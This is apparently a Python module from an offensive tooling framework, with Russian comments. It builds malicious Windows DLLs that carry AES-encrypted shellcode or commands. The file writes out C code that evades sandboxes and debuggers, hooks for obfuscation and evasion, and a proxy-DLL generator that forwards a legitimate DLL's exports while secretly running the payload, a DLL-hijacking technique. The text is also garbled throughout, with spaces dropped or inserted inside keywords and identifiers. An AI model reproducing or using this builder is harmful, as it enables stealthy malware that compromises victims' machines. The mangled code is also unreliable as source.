import os



import re



import tempfile



import subprocess



import random



import pefile



from typ in gimport List,Dict,Any,Union,Optional







from core.interfacesimport Bas eGenerator



from utils.cryptoimport aes_encrypt,generate_key,generate_encryption_stub







clas sDllGenerator(Bas eGenerator):











def__init__(self):



        self.template_path=None



self.template_file="dll_template.c"







defgenerate(self,



payload:str,



template_path:str,



obfuscators:List=None,



evas ion_techniques:List=None,



iterations:int=1)->bytes:







self.template_path=template_path















payload_type="shellcode"



proxy_dll_path=None



target_dll_name=None







if payload.startswith("shellcode:"):



            payload=payload[len("shellcode:"):]



payload_type="shellcode"



elif payload.startswith("command:"):



            payload=payload[len("command:"):]



payload_type="command"



elif payload.startswith("proxy:"):







            proxy_info=payload[len("proxy:"):].split("|")



if len(proxy_info)>=1:



                proxy_dll_path=proxy_info[0]



payload_type="proxy"



if len(proxy_info)>=2:



                    target_dll_name=proxy_info[1]











template_file_path=os.path.join(template_path,self.template_file)



if notos.path.exists(template_file_path):



            template_file_path=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),



"templates","dll",self.template_file)







if notos.path.exists(template_file_path):



            raiseFileNotFoundError(f"Шаблон не найден: {template_file_path}")







withopen(template_file_path,'r')as f:



            template=f.read()











if payload_type=="shellcode":



            if os.path.exists(payload):



                withopen(payload,'rb')as f:



                    payload_data=f.read()



else:







                try:



                    payload_data=bytes.from hex(payload.replace('\\x','').replace('0x','').replace(' ',''))



except:



                    raiseValueError(f"Невозможно преобразовать шелл-код: {payload}")



elif payload_type=="command":



            payload_data=payload.encode('utf-8')



elif payload_type=="proxy":







            if notos.path.exists(proxy_dll_path):



                raiseFileNotFoundError(f"Оригинальная DLL не найдена: {proxy_dll_path}")











exports=self._get_dll_exports(proxy_dll_path)











payload_data=self._generate_proxy_code(exports,target_dll_nameoros.path.bas ename(proxy_dll_path))











if os.path.exists(os.path.join(template_path,"dll_proxy_template.c")):



                withopen(os.path.join(template_path,"dll_proxy_template.c"),'r')as f:



                    template=f.read()



elif os.path.exists(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),"templates","dll","dll_proxy_template.c")):



                withopen(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),"templates","dll","dll_proxy_template.c"),'r')as f:



                    template=f.read()











key=generate_key(32)







if payload_typein["shellcode","command"]:



            encrypted_payload,key,iv=aes_encrypt(payload_data,key)











formatted_payload=self._format_bytes_for_c(encrypted_payload)



formatted_key=self._format_bytes_for_c(key)



formatted_iv=self._format_bytes_for_c(iv)











decrypt_function=generate_encryption_stub("c","aes")











template=template.replace("{{PAYLOAD}}",formatted_payload)



template=template.replace("{{PAYLOAD_SIZE}}",str(len(encrypted_payload)))



template=template.replace("{{KEY}}",formatted_key)



template=template.replace("{{KEY_SIZE}}",str(len(key)))



template=template.replace("{{IV}}",formatted_iv)



template=template.replace("{{PAYLOAD_TYPE}}",f'const char* type_var = "{payload_type}";')



template=template.replace("{{DECRYPT_FUNC}}",decrypt_function)



elif payload_type=="proxy":







            template=template.replace("{{PROXY_EXPORTS}}",payload_data.decode('utf-8')if is in stance(payload_data,bytes)elsepayload_data)



template=template.replace("{{ORIGINAL_DLL}}",os.path.bas ename(proxy_dll_path))











anti_vm_code=self._generate_anti_vm_code()



anti_debug_code=self._generate_anti_debug_code()



template=template.replace("{{ANTI_VM_CODE}}",anti_vm_code)



template=template.replace("{{ANTI_DEBUG_CODE}}",anti_debug_code)











if obfuscators:



            obfuscated_code=template



for_inrange(iterations):



                forobfuscator in obfuscators:



                    obfuscated_code=obfuscator.obfuscate(obfuscated_code)



template=obfuscated_code











if evas ion_techniques:



            evas ion_code=template



fortechnique in evas ion_techniques:



                evas ion_code=technique.apply(evas ion_code)



template=evas ion_code











return self._compile_dll(template,target_dll_name)







def_format_bytes_for_c(self,data:bytes)->str:







return", ".join([f"0x{b:02x}"forb in data])







def_generate_anti_vm_code(self)->str:







return"""
// Функция для обнаружения виртуальной машины
BOOL isVirtualMach in e() {
    SYSTEM_INFO sysInfo;
    DWORD return Len = 0;
    LPVOID drivers[1024];
    int i;
    char deviceName[1024];
    
    // Проверка имени компьютера
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    if (GetComputerNameA(hostname, &hostname_len)) {
        const char* vm_hostnames[] = {
            "Virtual", "VirtualBox", "VMware", "vbox", "sandbox", "Sandbox", "SANDBOX"
        };
        
        for (i = 0; i < sizeof(vm_hostnames) / sizeof(vm_hostnames[0]); i++) {
            if (strstr(hostname, vm_hostnames[i])) {
                return TRUE;
            }
        }
    }
    
    // Проверка размера RAM (часто в ВМ меньше 4 ГБ)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        if (memInfo.ullTotalPhys < 4ULL * 1024ULL * 1024ULL * 1024ULL) {
            return TRUE;
        }
    }
    
    // Проверка процессов, связанных с VM
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                const char* vm_processes[] = {
                    "vmtoolsd.exe", "vboxtray.exe", "vboxservice.exe", "vmwaretray.exe",
                    "vmware.exe", "vmsrvc.exe", "vmusrvc.exe", "prl_tools.exe",
                    "qemu-ga.exe", "sandboxiedcomlaunch.exe", "sandboxierpcss.exe"
                };
                
                for (i = 0; i < sizeof(vm_processes) / sizeof(vm_processes[0]); i++) {
                    if (_stricmp(pe32.szExeFile, vm_processes[i]) == 0) {
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
    
    return FALSE;
}
"""







def_generate_anti_debug_code(self)->str:







return"""
// Функция для обнаружения отладчика
BOOL isDebugged() {
    // 1. Прямая проверка через IsDebuggerPresent API
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // 2. Проверка через NtQueryInformationProcess
    typedef NTSTATUS (WINAPI* pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClas s,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            DWORD processDebugPort = 0;
            NTSTATUS status = NtQueryInformationProcess(
                GetCurrentProcess(),
                7, // ProcessDebugPort
                &processDebugPort,
                sizeof(processDebugPort),
                NULL
            );
            
            if (status == 0 && processDebugPort != 0) {
                return TRUE;
            }
        }
    }
    
    // 3. Проверка через PEB (Структура блока окружения процесса)
    #if def _WIN64
        // 64-битная версия
        BYTE* pPeb = (BYTE*)__readgsqword(0x60);
        BYTE debugFlag = *(pPeb + 2);
        if (debugFlag) {
            return TRUE;
        }
    #else
        // 32-битная версия
        BYTE* pPeb = (BYTE*)__readfsdword(0x30);
        BYTE debugFlag = *(pPeb + 2);
        if (debugFlag) {
            return TRUE;
        }
    #endif
    
    // 4. Замер времени выполнения (в отладчике будет дольше)
    DWORD startTime = GetTickCount();
    for (volatile int i = 0; i < 1000000; i++);
    DWORD endTime = GetTickCount();
    
    if (endTime - startTime > 1000) {  // Если выполнялось более 1 секунды
        return TRUE;
    }
    
    return FALSE;
}
"""







def_get_dll_exports(self,dll_path:str)->List[Dict[str,Any]]:







try:



            pe=pefile.PE(dll_path)



exports=[]







if has attr(pe,'DIRECTORY_ENTRY_EXPORT'):



                forexp in pe.DIRECTORY_ENTRY_EXPORT.symbols:



                    if exp.name:



                        exports.append({



'name':exp.name.decode('utf-8'),



'ord in al':exp.ord in al



})







return exports



except Exceptionas e:



            pr in t(f"Ошибка при чтении экспортируемых функций из DLL: {str(e)}")



return[]







def_generate_proxy_code(self,exports:List[Dict[str,Any]],orig in al_dll:str)->str:







if notexports:



            return"// Нет экспортируемых функций для проксирования"











declarations=[]



implementations=[]



exports_table=[]







forexport in exports:



            func_name=export['name']



ord in al=export['ord in al']











ptr_name=f"p_{func_name}"











declarations.append(f"typedef FARPROC {ptr_name}_t;")



declarations.append(f"{ptr_name}_t {ptr_name} = NULL;")











implementations.append(f"""
// Проксирование функции {func_name} (ord in al: {ord in al})
__declspec(dllexport) FARPROC {func_name}() {{
    if (!g_hOrig in alDll) {{
        g_hOrig in alDll = LoadLibraryA(g_szOrig in alDll);
        if (!g_hOrig in alDll) {{
            return NULL;
        }}
    }}
    
    if (!{ptr_name}) {{
        {ptr_name} = (void*)GetProcAddress(g_hOrig in alDll, "{func_name}");
        if (!{ptr_name}) {{
            {ptr_name} = (void*)GetProcAddress(g_hOrig in alDll, MAKEINTRESOURCEA({ord in al}));
            if (!{ptr_name}) {{
                return NULL;
            }}
        }}
    }}
    
    // Выполняем нашу полезную нагрузку только один раз
    if (!g_bPayloadExecuted) {{
        ExecutePayload();
        g_bPayloadExecuted = TRUE;
    }}
    
    // Перенаправляем вызов на оригинальную функцию
    return (FARPROC){ptr_name};
}}""")











exports_table.append(f"    {{ \"{func_name}\", {func_name} }},")











code="\n".join(declarations)+"\n\n"+"\n".join(implementations)+"\n\n"



code+="// Таблица экспортируемых функций\n"



code+="ExportEntry g_ExportTable[] = {\n"+"\n".join(exports_table)+"\n    { NULL, NULL }\n};\n"







return code







def_compile_dll(self,code:str,dll_name:str=None)->bytes:











withtempfile.TemporaryDirectory()as temp_dir:







            source_file=os.path.join(temp_dir,"payload.c")



withopen(source_file,"w")as f:



                f.write(code)











dll_filename=f"{dll_name or 'payload'}.dll"



output_file=os.path.join(temp_dir,dll_filename)











try:







                if'TESTING'inos.environ:



                    return code.encode('utf-8')











compile_cmd=[



"gcc",source_file,"-o",output_file,



"-shared",



"-s",



"-w",



"-fpic",



"-O2"



]











result=subprocess.run(



compile_cmd,



capture_output=True,



check=True



)











withopen(output_file,"rb")as f:



                    compiled_b in ary=f.read()







return compiled_b in ary







except subprocess.CalledProcessErroras e:



                raiseRuntimeError(f"Ошибка компиляции DLL: {e.stderr.decode()}")from e



except Exceptionas e:



                raiseRuntimeError(f"Ошибка при создании DLL: {str(e)}")from e